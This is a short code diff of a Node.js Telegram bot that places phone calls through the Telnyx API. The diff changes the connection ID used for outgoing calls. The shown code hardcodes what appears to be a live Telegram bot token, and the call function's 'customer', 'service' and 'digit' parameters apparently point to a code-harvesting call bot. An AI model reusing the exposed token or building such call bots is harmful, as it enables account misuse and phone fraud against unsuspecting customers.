@@ -5,6 +5,7 @@ const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 const ENV_TELNYX_CONNECTION_ID = '2305462997117568053'
 const alt_control_id = '2305446111344592690'
+const al_alt ='2305800116734265211'
 const telnyx = require('telnyx')(MY_API_KEY);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 var bot = new Telegraf(bot_token)
@@ -27,7 +28,7 @@ async function call (customer_number, ctx, service, digit){
    // Use the Telnyx API to create a new call
    try {
       const { data: call } = await telnyx.calls.create({
-         connection_id: ENV_TELNYX_CONNECTION_ID,
+         connection_id: alt_control_id,
          to: customer_number,
          from: service_number,
          // webhook_url: WEBHOOK_URL
